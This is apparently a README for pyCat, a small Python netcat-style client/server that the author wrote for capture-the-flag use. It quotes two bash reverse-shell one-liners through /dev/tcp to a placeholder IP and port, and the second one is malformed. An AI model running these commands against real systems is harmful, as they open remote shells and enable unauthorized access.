# pyCat
Simple python-based client/server for interacting with remote systems.

Why pyCat?
----------
Many times in my CTF adventures, I would find Netcat installed, but the '-e' option wouldn't be available. 

Yes, I know there are other ways to get reverse-shell when you have command-injection on a system, but I really like the ease of Netcat. 

Plus sometimes the shells I get using... 

  `bash -i >& /dev/tcp/IP/PORT 0>&1`
  
  or 
  
  `/bin/bash -c '/bin/bash>/dev/null/IP/PORT 2>&1 0>&1'`
  
...can be inconsistent in the way they act from time to time.



So, I found myself wanting to have a stand-alone executable of Netcat for Linux systems, but didn't find one after searching for a **SOLID** 10 minutes. It also had the added benefit of being a good way to learn more Python.

I will be attempting to make this work on Windows operating systems, so keep an eye out for that version soon.


Thanks to **Justin** for helping me debug the socket connection.
